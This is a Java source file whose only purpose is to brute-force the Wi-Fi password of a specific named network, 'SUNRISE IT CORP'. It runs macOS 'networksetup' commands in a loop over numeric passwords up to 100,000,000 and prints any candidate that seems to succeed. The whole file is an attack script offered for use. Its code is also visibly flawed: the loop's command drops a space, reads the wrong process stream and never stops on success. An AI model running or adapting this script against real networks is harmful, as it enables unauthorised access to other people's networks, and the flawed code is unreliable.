package runtime;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class SolutionRuntimeHackWifi {

	public static void main(String[] args) {
		Runtime runtime = Runtime.getRuntime();
		
		
		try {
			

			int password = 0;
			
			System.out.println("networksetup -setairportnetwork en0 " + " \"SUNRISE IT CORP\" " + " " +password);

			
			Process process = 
					runtime.exec("networksetup -setairportnetwork en0 " + " \"SUNRISE IT CORP\" " + " " +password);
			

			
			BufferedReader reader = 
					new BufferedReader(new InputStreamReader(process.getInputStream()));
			String error = reader.readLine();
			String result = null;
			
			System.out.println(error);
			reader.close();
			for (; password< 100000000  ; password++) {
				BufferedReader reader1 = 
						new BufferedReader(new InputStreamReader(process.getInputStream()));
				process = 
						runtime.exec("networksetup -setairportnetwork en0 \"SUNRISE IT CORP\"" + password);
				
				result = reader1.readLine();
				System.out.println(result);
				if (error.equals(result) == false) {
					System.out.println(password);
				}
				reader1.close();
			}
			
			
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("error");
		} finally {
			runtime.exit(0);
		}		
	}
}

